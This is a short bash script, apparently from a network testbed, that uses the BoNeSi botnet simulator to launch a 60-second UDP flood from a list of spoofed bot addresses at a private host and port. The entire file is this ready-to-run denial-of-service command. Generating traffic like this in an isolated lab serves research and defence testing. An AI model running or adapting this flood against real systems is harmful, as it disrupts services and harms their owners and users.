#!/bin/bash

# BoNeSi UDP Flood (0 bytes) (60 seconds)
sudo timeout -s INT 60 bonesi -i bots.txt -p udp -s 0 192.168.100.2:50001